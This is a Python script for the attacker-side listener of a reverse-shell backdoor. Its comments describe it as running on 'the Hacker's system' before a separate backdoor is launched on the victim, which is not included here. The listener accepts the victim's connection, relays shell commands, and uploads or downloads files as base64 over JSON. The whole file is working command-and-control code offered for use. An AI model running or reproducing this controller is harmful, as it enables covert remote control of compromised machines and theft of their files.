# The Given "Listener" code must be running before the Backdoor code is executed.
import socket
import simplejson
import base64


class Listener:
    def __init__(self, ip_hacker, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Modifying option to reuse sockets
        listener.bind((ip_hacker, port))  # Binding socket to computer to listen for incoming connections.
        listener.listen(0)
        print("[..]Waiting for incoming connections..,")
        self.connection, address = listener.accept()
        print("[+][+]Connection Accepted from " + str(address))

    def reliable_send(self, data):
        json_data = simplejson.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b" "
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return simplejson.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()

        return self.reliable_receive()

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[=]Download Successful."

    def run(self):
        while True:
            command = input(">>> ")
            command = command.split(" ")

            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)
                result = self.execute_remotely(command)

                if command[0] == "download" and "[x_x] Error " not in result:
                    result = self.write_file(command[1], result)
            except Exception:
                result = "[x_x] Error during Command Execution."
            print(result)


my_listener = Listener('192.192.92.3', 8080) # IP address of the Hacker's system and PORT number on which you want to establish the TCP connection. 
my_listener.run()
